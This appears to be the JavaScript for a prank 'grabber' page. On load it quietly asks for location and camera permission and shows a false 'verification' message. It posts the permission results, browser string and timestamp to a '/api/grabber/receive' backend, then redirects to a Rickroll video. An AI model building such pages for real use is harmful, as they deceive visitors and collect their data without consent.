const backendUrl = `${CONFIG.API_URL}/api/grabber/receive`;
const youtubeUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

const statusElement = document.getElementById("status");
const loader = document.getElementById("loader");

async function requestLocationPermission() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve("UNAVAILABLE");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      () => resolve("GRANTED"),
      () => resolve("DENIED"),
      { timeout: 10000 },
    );
  });
}

async function requestCameraPermission() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    stream.getTracks().forEach((track) => track.stop());
    return "GRANTED";
  } catch (error) {
    return "DENIED";
  }
}

async function sendPermissionResults(data) {
  try {
    const response = await fetch(backendUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    return true;
  } catch (error) {
    console.error("Erro no backend:", error);
    return false;
  }
}

async function runVerification() {
  loader.hidden = false;

  statusElement.textContent = "Verificando localização...";
  const locationPermission = await requestLocationPermission();
  statusElement.textContent = "Verificando câmera...";
  const cameraPermission = await requestCameraPermission();

  const data = {
    locationPermission,
    cameraPermission,
    browser: navigator.userAgent,
    timestamp: new Date().toISOString(),
  };

  console.log("Resultado das permissões:", data);

  statusElement.textContent = "Enviando resultados...";
  await sendPermissionResults(data);

  statusElement.textContent = "Verificação concluída!";

  setTimeout(() => {
    window.location.href = youtubeUrl;
  }, 1500);
}

// Executa automaticamente ao carregar a página
window.addEventListener("load", runVerification);
